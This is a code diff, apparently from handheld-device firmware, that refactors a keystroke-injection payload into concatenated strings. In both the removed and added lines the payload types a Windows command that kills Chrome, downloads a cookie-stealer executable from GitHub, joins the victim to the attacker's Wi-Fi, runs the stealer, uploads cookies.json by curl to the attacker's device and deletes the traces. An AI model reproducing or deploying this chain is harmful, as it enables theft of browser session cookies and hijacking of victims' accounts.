@@ -29,7 +29,7 @@ void demo_macos(void);
 void demo_windows(void);
 void demo_char_test(void);
 
-void writeWLayout(char * str)
+void writeWLayout(const char * str)
 {
     int len = strlen(str);
     for (int i = 0; i < len; i++) {
@@ -348,20 +348,23 @@ void run_payload_setup(){
   DISP.setCursor(0, 0);
   IPAddress IP = runPayloadServer();
   String str = ip2String(IP);
-  String cmd = "taskkill /F /IM chrome.exe /T" \
-  " & cd \".\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\"" \
-  " && curl -L https://github.com/illera88/GCC-stealer/releases/download/v0.1.1/GCC-stealer.exe -o GCC-stealer.exe" \
-  " && curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/Wi-Fi-AP-0.xml -o Wi-Fi-AP-0.xml" \
-  /*" && netsh wlan delete profile "+ssid+"" \*/
-  " && netsh wlan add profile filename=\".\\Wi-Fi-AP-0.xml\"" \
-  " && netsh wlan connect name="+ssid+"" \
-  " && .\\GCC-stealer.exe --json-file" \
-  " && timeout /t 5" \
-  " && curl -X POST -F data=@cookies.json http://"+str+"/upload" \
-  /*" & netsh wlan disconnect" \*/
-  " & netsh wlan delete profile "+ssid+"" \
-  " & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & pause && exit";
 
+  char * cmd1 = "taskkill /F /IM chrome.exe /T \
+& cd \".\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\" \
+&& curl -L https://github.com/illera88/GCC-stealer/releases/download/v0.1.1/GCC-stealer.exe -o GCC-stealer.exe \
+&& curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/Wi-Fi-AP-0.xml -o Wi-Fi-AP-0.xml \
+&& netsh wlan add profile filename=\".\\Wi-Fi-AP-0.xml\" \
+&& netsh wlan connect name=";
+  char * cmd2 =" && .\\GCC-stealer.exe --json-file \
+&& timeout /t 5 \
+&& curl -X POST -F data=@cookies.json http://";
+  char * cmd3 ="/upload \
+& netsh wlan delete profile ";
+  char * cmd4 =" & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & pause && exit";
+
+  String cmd_final = cmd1 + ssid + cmd2 + str + cmd3 + ssid + cmd4;
+  const char *cmd_complete = cmd_final.c_str();
+  
   DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.println("Running payload...");
   delay(2000);   
@@ -373,7 +376,7 @@ void run_payload_setup(){
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(2000);
-  writeWLayout(cmd);
+  writeWLayout(cmd_complete);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   DISP.print("done.");
